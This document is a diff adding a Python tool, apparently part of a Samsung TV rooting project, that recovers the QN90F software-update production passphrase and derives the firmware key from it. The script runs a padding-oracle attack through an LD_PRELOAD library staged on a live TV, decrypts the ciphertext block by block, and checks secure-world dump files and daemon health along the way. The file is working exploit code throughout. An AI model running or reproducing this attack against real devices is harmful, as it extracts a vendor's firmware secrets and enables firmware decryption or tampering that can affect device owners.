@@ -1,0 +1,383 @@
+#!/usr/bin/env python3
+"""Recover the complete formatted QN90F SWU production passphrase."""
+
+from __future__ import annotations
+
+import argparse
+import hashlib
+import json
+import sys
+from functools import partial
+from pathlib import Path
+
+from samsung_tv_root.controller import ControllerError, default_control_file
+from samsung_tv_root.sdb import SdbError
+
+from .swu_padding_oracle import (
+    BLOCK_SIZE,
+    CANDIDATE_SIZE,
+    LiveOracle,
+    OracleError,
+    recover_last_block,
+    validation_candidates,
+    write_private_json,
+)
+
+
+TOOLS_DIRECTORY = Path(__file__).resolve().parent
+HEX_DIGITS = b"0123456789abcdef"
+CIPHERTEXT_BLOCKS = CANDIDATE_SIZE // BLOCK_SIZE
+FORMATTED_VALUE_COUNT = 80
+TRAILING_PADDING_SIZE = 10
+
+
+def build_format_options() -> list[bytes]:
+    options: list[bytes] = []
+    for index in range(FORMATTED_VALUE_COUNT):
+        options.extend((b"0", b"x", HEX_DIGITS, HEX_DIGITS))
+        if index < FORMATTED_VALUE_COUNT - 1:
+            options.append(b",")
+        if index % 10 == 9 and index < FORMATTED_VALUE_COUNT - 1:
+            options.append(b"\n")
+    options.extend([b"\n"] * 10)
+    if len(options) != CANDIDATE_SIZE:
+        raise AssertionError(f"formatted passphrase is {len(options)} bytes")
+    return options
+
+
+def relocate_block(encrypted: bytes, target_block: int) -> bytes:
+    if target_block < 0 or target_block >= CIPHERTEXT_BLOCKS:
+        raise ValueError("target block is outside the encrypted passphrase")
+    relocated = bytearray(encrypted)
+    if target_block == 0:
+        relocated[-2 * BLOCK_SIZE : -BLOCK_SIZE] = bytes(BLOCK_SIZE)
+        relocated[-BLOCK_SIZE:] = encrypted[:BLOCK_SIZE]
+    else:
+        source_start = (target_block - 1) * BLOCK_SIZE
+        relocated[-2 * BLOCK_SIZE :] = encrypted[
+            source_start : source_start + 2 * BLOCK_SIZE
+        ]
+    return bytes(relocated)
+
+
+def empty_block_state() -> dict[str, object]:
+    return {
+        "intermediate": [None] * BLOCK_SIZE,
+        "plaintext": [None] * BLOCK_SIZE,
+        "completed_padding": 0,
+        "complete": False,
+    }
+
+
+def load_state(path: Path, digest: str) -> dict[str, object]:
+    try:
+        state = json.loads(path.read_text(encoding="utf-8"))
+    except FileNotFoundError:
+        return {
+            "input_sha256": digest,
+            "blocks": {},
+            "complete": False,
+        }
+    if state.get("input_sha256") != digest:
+        raise OracleError("state file belongs to a different encrypted input")
+    if not isinstance(state.get("blocks"), dict):
+        raise OracleError("state file has invalid block data")
+    return state
+
+
+def parse_seed(value: str) -> tuple[int, Path]:
+    raw_block, separator, raw_path = value.partition("=")
+    if not separator:
+        raise argparse.ArgumentTypeError("seed must use BLOCK=PATH")
+    try:
+        block = int(raw_block, 10)
+    except ValueError as error:
+        raise argparse.ArgumentTypeError("seed block must be an integer") from error
+    if block < 0 or block >= CIPHERTEXT_BLOCKS:
+        raise argparse.ArgumentTypeError("seed block is outside the passphrase")
+    return block, Path(raw_path).expanduser()
+
+
+def apply_seeds(state: dict[str, object], seeds: list[tuple[int, Path]]) -> None:
+    blocks = state["blocks"]
+    for block, path in seeds:
+        if str(block) in blocks:
+            continue
+        payload = json.loads(path.read_text(encoding="utf-8"))
+        intermediate = payload.get("intermediate")
+        plaintext = payload.get("plaintext")
+        if (
+            not isinstance(intermediate, list)
+            or not isinstance(plaintext, list)
+            or len(intermediate) != BLOCK_SIZE
+            or len(plaintext) != BLOCK_SIZE
+        ):
+            raise OracleError(f"seed {path} has invalid recovery arrays")
+        completed = 0
+        for value in reversed(intermediate):
+            if value is None:
+                break
+            completed += 1
+        blocks[str(block)] = {
+            "intermediate": intermediate,
+            "plaintext": plaintext,
+            "completed_padding": completed,
+            "complete": completed == BLOCK_SIZE,
+            "seed": str(path),
+            "validation": payload.get("validation"),
+        }
+
+
+def validate_plaintext(plaintext: bytes, options: list[bytes]) -> None:
+    for index, (value, allowed) in enumerate(zip(plaintext, options, strict=True)):
+        if value not in allowed:
+            raise OracleError(
+                f"plaintext byte {index} is 0x{value:02x}, outside the format"
+            )
+
+
+def parse_formatted_passphrase(plaintext: bytes) -> tuple[list[bytes], bytes]:
+    if len(plaintext) != CANDIDATE_SIZE:
+        raise OracleError("recovered plaintext must contain exactly 416 bytes")
+    padding = b"\n" * TRAILING_PADDING_SIZE
+    if not plaintext.endswith(padding):
+        raise OracleError("recovered plaintext has invalid trailing padding")
+
+    significant = plaintext[:-TRAILING_PADDING_SIZE]
+    canonical = b"".join(significant.splitlines())
+    tokens = canonical.split(b",")
+    if len(tokens) != FORMATTED_VALUE_COUNT or any(
+        len(token) != 4 or not token.startswith(b"0x")
+        for token in tokens
+    ):
+        raise OracleError("recovered plaintext has invalid token structure")
+    return tokens, significant
+
+
+def derive_firmware_key(plaintext: bytes) -> bytes:
+    _, significant = parse_formatted_passphrase(plaintext)
+    return hashlib.sha256(significant).digest()
+
+
+def finalize_complete_state(
+    state: dict[str, object],
+    options: list[bytes],
+) -> bool:
+    blocks = state["blocks"]
+    if not all(
+        str(block) in blocks and blocks[str(block)].get("complete")
+        for block in range(CIPHERTEXT_BLOCKS)
+    ):
+        return False
+
+    plaintext = bytes(
+        value
+        for block in range(CIPHERTEXT_BLOCKS)
+        for value in blocks[str(block)]["plaintext"]
+    )
+    validate_plaintext(plaintext, options)
+    tokens, _ = parse_formatted_passphrase(plaintext)
+    state.pop("canonical_sha256", None)
+    state.update(
+        {
+            "plaintext_hex": plaintext.hex(),
+            "firmware_key_hex": derive_firmware_key(plaintext).hex(),
+            "formatted_value_count": len(tokens),
+            "complete": True,
+        }
+    )
+    return True
+
+
+def save_block_progress(
+    output_path: Path,
+    state: dict[str, object],
+    block_state: dict[str, object],
+    block: int,
+    oracle: LiveOracle,
+    intermediate: list[int | None],
+    plaintext: list[int | None],
+    completed_padding: int,
+) -> None:
+    block_state.update(
+        {
+            "intermediate": intermediate,
+            "plaintext": plaintext,
+            "completed_padding": completed_padding,
+            "complete": completed_padding == BLOCK_SIZE,
+        }
+    )
+    state["query_count_this_run"] = oracle.query_count
+    state["batch_count_this_run"] = oracle.batch_count
+    write_private_json(output_path, state)
+    print(
+        f"recovered block={block} position={BLOCK_SIZE - completed_padding} "
+        f"queries={oracle.query_count}",
+        flush=True,
+    )
+
+
+def parse_args() -> argparse.Namespace:
+    parser = argparse.ArgumentParser(description=__doc__)
+    parser.add_argument("input", type=Path)
+    parser.add_argument("output", type=Path, help="mode-0600 recovery state")
+    parser.add_argument(
+        "--preload",
+        type=Path,
+        default=TOOLS_DIRECTORY
+        / "out"
+        / "libswu-init-oracle-batch-preload.so",
+    )
+    parser.add_argument("--host", required=True)
+    parser.add_argument("--salt", type=Path, required=True)
+    parser.add_argument("--control-file", type=Path, default=default_control_file())
+    parser.add_argument("--command-timeout", type=float, default=30.0)
+    parser.add_argument(
+        "--seed-block",
+        action="append",
+        type=parse_seed,
+        default=[],
+        metavar="BLOCK=PATH",
+    )
+    parser.add_argument(
+        "--first-block",
+        type=int,
+        default=CIPHERTEXT_BLOCKS - 1,
+        help="highest ciphertext block to process",
+    )
+    parser.add_argument(
+        "--last-block",
+        type=int,
+        default=0,
+        help="lowest ciphertext block to process",
+    )
+    return parser.parse_args()
+
+
+def main() -> int:
+    arguments = parse_args()
+    try:
+        encrypted = arguments.input.read_bytes()
+        if len(encrypted) != CANDIDATE_SIZE:
+            raise OracleError("encrypted input must contain exactly 416 bytes")
+        if not (
+            0 <= arguments.last_block <= arguments.first_block < CIPHERTEXT_BLOCKS
+        ):
+            raise OracleError("invalid first/last block range")
+        digest = hashlib.sha256(encrypted).hexdigest()
+        options = build_format_options()
+        state = load_state(arguments.output, digest)
+        apply_seeds(state, arguments.seed_block)
+        write_private_json(arguments.output, state)
+
+        blocks = state["blocks"]
+        pending_blocks = [
+            block
+            for block in range(arguments.first_block, arguments.last_block - 1, -1)
+            if not (
+                blocks.get(str(block), {}).get("complete")
+                and blocks.get(str(block), {}).get("validation") == [True, False]
+            )
+        ]
+        if not pending_blocks:
+            finalize_complete_state(state, options)
+            state["query_count_this_run"] = 0
+            state["batch_count_this_run"] = 0
+            write_private_json(arguments.output, state)
+            print(
+                f"formatted_recovery_checkpoint output={arguments.output} "
+                "queries=0 batches=0 "
+                f"complete={str(bool(state.get('complete'))).lower()}",
+            )
+            return 0
+
+        host = arguments.host
+        oracle = LiveOracle(
+            host,
+            arguments.preload,
+            arguments.salt,
+            arguments.command_timeout,
+            arguments.control_file,
+        )
+        oracle.stage()
+        health_before = oracle.health()
+        dumps_before = oracle.execute(
+            "/usr/bin/find /opt/data/save_error_log/error_log/secureos_dump "
+            "-maxdepth 1 -type f -printf '%f %s %T@\\n' 2>/dev/null",
+            5.0,
+        ).get("stdout", "")
+
+        for block in range(arguments.first_block, arguments.last_block - 1, -1):
+            block_state = blocks.setdefault(str(block), empty_block_state())
+            if block_state.get("complete") and block_state.get("validation") == [True, False]:
+                continue
+            relocated = relocate_block(encrypted, block)
+            block_options = options[block * BLOCK_SIZE : (block + 1) * BLOCK_SIZE]
+
+            intermediate, plaintext = recover_last_block(
+                relocated,
+                oracle.evaluate,
+                intermediate=block_state["intermediate"],
+                plaintext_options=block_options,
+                progress=partial(
+                    save_block_progress,
+                    arguments.output,
+                    state,
+                    block_state,
+                    block,
+                    oracle,
+                ),
+            )
+            validation = oracle.evaluate(validation_candidates(relocated, intermediate))
+            if validation != [True, False]:
+                raise OracleError(
+                    f"block {block} validation returned {validation!r}"
+                )
+            block_state.update(
+                {
+                    "intermediate": intermediate,
+                    "plaintext": plaintext,
+                    "completed_padding": BLOCK_SIZE,
+                    "validation": validation,
+                    "complete": True,
+                }
+            )
+            if oracle.health() != health_before:
+                raise OracleError(f"security-tzdaemon health changed after block {block}")
+            dumps_after = oracle.execute(
+                "/usr/bin/find /opt/data/save_error_log/error_log/secureos_dump "
+                "-maxdepth 1 -type f -printf '%f %s %T@\\n' 2>/dev/null",
+                5.0,
+            ).get("stdout", "")
+            if dumps_after != dumps_before:
+                raise OracleError(f"secure-world dump set changed after block {block}")
+            write_private_json(arguments.output, state)
+            print(
+                f"validated block={block} queries={oracle.query_count} "
+                "tzdaemon=unchanged dumps=unchanged",
+                flush=True,
+            )
+
+        finalize_complete_state(state, options)
+        state["query_count_this_run"] = oracle.query_count
+        state["batch_count_this_run"] = oracle.batch_count
+        write_private_json(arguments.output, state)
+        print(
+            f"formatted_recovery_checkpoint output={arguments.output} "
+            f"queries={oracle.query_count} batches={oracle.batch_count} "
+            f"complete={str(bool(state.get('complete'))).lower()}",
+        )
+        return 0
+    except (
+        OSError,
+        ValueError,
+        OracleError,
+        ControllerError,
+        SdbError,
+    ) as error:
+        print(f"error: {error}", file=sys.stderr)
+        return 1
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
